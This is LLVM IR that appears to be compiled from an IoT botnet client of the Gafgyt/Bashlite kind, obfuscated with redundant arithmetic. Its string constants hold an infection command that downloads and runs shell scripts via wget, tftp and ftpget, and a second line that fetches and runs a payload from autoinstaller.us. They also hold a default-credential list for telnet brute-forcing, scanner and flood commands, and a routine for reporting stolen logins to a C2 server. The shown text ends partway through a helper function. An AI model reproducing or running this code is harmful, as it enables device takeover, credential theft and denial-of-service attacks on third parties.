; ModuleID = 'host/ir_sub/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -809524566
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, -809524566
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 %10, 1046956671
  %12 = add i32 %11, -1640531527
  %13 = add i32 %12, 1046956671
  %14 = add i32 %10, -1640531527
  %15 = add i32 %13, 841547094
  %16 = add i32 %15, -1640531527
  %17 = sub i32 %16, 841547094
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %70, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %75

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = sub i32 0, 3
  %25 = add i32 %23, %24
  %26 = sub nsw i32 %23, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 481446444
  %32 = sub i32 %31, 2
  %33 = sub i32 %32, 481446444
  %34 = sub nsw i32 %30, 2
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %29, -1
  %39 = and i32 %37, %38
  %40 = xor i32 %37, -1
  %41 = and i32 %29, %40
  %42 = or i32 %39, %41
  %43 = xor i32 %29, %37
  %44 = xor i32 %42, -1
  %45 = and i32 98503434, %44
  %46 = xor i32 98503434, -1
  %47 = and i32 %42, %46
  %48 = xor i32 -1640531527, -1
  %49 = and i32 %48, 98503434
  %50 = and i32 -1640531527, %46
  %51 = or i32 %45, %47
  %52 = or i32 %49, %50
  %53 = xor i32 %51, %52
  %54 = xor i32 %42, -1640531527
  %55 = load i32, i32* %3, align 4
  %56 = xor i32 %53, -1
  %57 = and i32 -1753533104, %56
  %58 = xor i32 -1753533104, -1
  %59 = and i32 %53, %58
  %60 = xor i32 %55, -1
  %61 = and i32 %60, -1753533104
  %62 = and i32 %55, %58
  %63 = or i32 %57, %59
  %64 = or i32 %61, %62
  %65 = xor i32 %63, %64
  %66 = xor i32 %53, %55
  %67 = load i32, i32* %3, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %68
  store i32 %65, i32* %69, align 4
  br label %70

; <label>:70:                                     ; preds = %22
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 0, 1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, 1
  store i32 %73, i32* %3, align 4
  br label %19

; <label>:75:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, -162408850
  %7 = add i32 %6, 1
  %8 = sub i32 %7, -162408850
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 1728152304, -1
  %13 = or i32 %10, %11
  %14 = or i32 1728152304, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %26
  %28 = sub i64 %24, %27
  %29 = add i64 %24, %26
  store i64 %28, i64* %1, align 8
  %30 = load i64, i64* %1, align 8
  %31 = lshr i64 %30, 32
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* @c, align 4
  %33 = load i64, i64* %1, align 8
  %34 = load i32, i32* @c, align 4
  %35 = zext i32 %34 to i64
  %36 = sub i64 0, %35
  %37 = sub i64 %33, %36
  %38 = add i64 %33, %35
  %39 = trunc i64 %37 to i32
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* %3, align 4
  %41 = load i32, i32* @c, align 4
  %42 = icmp ult i32 %40, %41
  br i1 %42, label %43, label %54

; <label>:43:                                     ; preds = %0
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 %44, 231870388
  %46 = add i32 %45, 1
  %47 = add i32 %46, 231870388
  %48 = add i32 %44, 1
  store i32 %47, i32* %3, align 4
  %49 = load i32, i32* @c, align 4
  %50 = sub i32 %49, -396565197
  %51 = add i32 %50, 1
  %52 = add i32 %51, -396565197
  %53 = add i32 %49, 1
  store i32 %52, i32* @c, align 4
  br label %54

; <label>:54:                                     ; preds = %43, %0
  %55 = load i32, i32* %4, align 4
  %56 = load i32, i32* %3, align 4
  %57 = sub i32 %55, 1748227816
  %58 = sub i32 %57, %56
  %59 = add i32 %58, 1748227816
  %60 = sub i32 %55, %56
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %62 = zext i32 %61 to i64
  %63 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %62
  store i32 %59, i32* %63, align 4
  ret i32 %59
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = add i64 %7, 6809393283275927764
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, 6809393283275927764
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %28

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = add i32 %23, 2035969773
  %25 = add i32 %24, 1
  %26 = sub i32 %25, 2035969773
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %4, align 4
  br label %13

; <label>:28:                                     ; preds = %13
  br label %29

